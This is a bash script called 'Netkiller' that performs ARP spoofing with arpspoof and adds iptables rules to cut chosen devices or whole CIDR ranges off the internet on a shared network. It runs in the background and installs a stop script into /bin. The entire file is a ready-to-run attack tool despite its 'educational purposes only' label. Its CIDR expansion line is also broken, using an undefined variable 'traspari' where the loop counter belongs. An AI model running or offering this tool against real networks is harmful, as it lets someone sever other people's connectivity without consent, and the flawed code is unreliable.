#!/bin/bash -e

# Made by Xiv3r v1.
# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: dsniff, iptables, ipcalc, and root privileges

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    echo "Please re-run using: sudo $0 $*"
    exit 1
fi

# Check for required tools
REQUIRED_TOOLS=("dsniff" "iptables" "ipcalc")

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo "$tool is required but not installed. Please install it."
        exit 1
    fi
done

# Detect Current Network Configuration
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
echo ""
echo "Current Network Information"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $IP"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Enter for default"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Enter for default"
read -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Target IPs or CIDR
echo "Enter Target IPs or CIDR (comma-separated, e.g., 10.0.0.123,10.0.0.124,192.168.1.0/24):"
read -p "> " IPS
# If no input, prompt again or exit
if [ -z "$IPS" ]; then
    echo "No target IPs or CIDR provided. Exiting."
    exit 1
fi
# Convert comma-separated IPs/CIDR to space-separated for iteration
INPUT_IPS=$(echo "$IPS" | tr ',' ' ')
echo ""

# Detect Device IP
MYIP="$IP"

# Prompt configuration
echo "Target Network Configuration"
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGETS:   | $INPUT_IPS"
echo ""

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Create stop script
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -t nat -F
iptables -F FORWARD
pkill -f arpspoof
echo "Netkiller is stopped!"
sleep 2s
echo "Restoring the client connections..."
EOF
chmod 755 /bin/netkiller-stop

# Function to expand CIDR to individual IPs using ipcalc
expand_cidr() {
    local cidr=$1
    # Use ipcalc to get the range of IPs
    local ip_range=$(ipcalc "$cidr" | grep '^Host' | awk '{print $2}')
    if [ -z "$ip_range" ]; then
        echo "Invalid CIDR: $cidr. Skipping." >&2
        return
    fi
    # Extract start and end IPs
    local start_ip=$(echo "$ip_range" | cut -d'-' -f1)
    local end_ip=$(echo "$ip_range" | cut -d'-' -f2)
    # Convert IPs to integers for iteration
    local start=$(echo "$start_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    local end=$(echo "$end_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    # Iterate through the range
    for ((i=start; i<=end; i++)); do
        # Convert integer back to IP
        echo "$(( (i>>24) & 255 )).$(( (i>>16) & 255 )).$(( (i>>8) & 255 )).$(( traspari & 255 ))"
    done
}

# Process each input (IP or CIDR)
TARGET_IPS=""
for INPUT in $INPUT_IPS; do
    # Check if input is a CIDR (contains '/')
    if echo "$INPUT" | grep -q '/'; then
        # Expand CIDR to individual IPs
        IPS_EXPANDED=$(expand_cidr "$INPUT")
        if [ -n "$IPS_EXPANDED" ]; then
            TARGET_IPS="$TARGET_IPS $IPS_EXPANDED"
        fi
    else
        # Validate single IP format
        if echo "$INPUT" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > /dev/null; then
            TARGET_IPS="$TARGET_IPS $INPUT"
        else
            echo "Invalid IP address: $INPUT. Skipping."
        fi
    fi
done

# Remove duplicates and ensure TARGET_IPS is not empty
TARGET_IPS=$(echo "$TARGET_IPS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
if [ -z "$TARGET_IPS" ]; then
    echo "No valid IPs or CIDR ranges provided. Exiting."
    exit 1
fi

# Iterate over each target IP
for TARGET in $TARGET_IPS; do
    # Skip if the target is the gateway or device IP
    if [ "$TARGET" = "$GATEWAY" ] || [ "$TARGET" = "$MYIP" ]; then
        echo "Skipping $TARGET (matches gateway or device IP)."
        continue
    fi
        # Block all traffic of the target wifi clients
        sudo iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
        sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
        sudo iptables -I FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
        sudo iptables -I FORWARD -s "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
        sudo iptables -I FORWARD -s "$TARGET" -j DROP
     (
        # Bidirectional ARP Spoofing
       sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
       sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
     ) &
       echo "Netkiller killing the target IP: $TARGET"
done

echo ""
echo "Netkiller attack is running in the background...!!!"
echo "To stop, run: sudo netkiller-stop"
echo " "
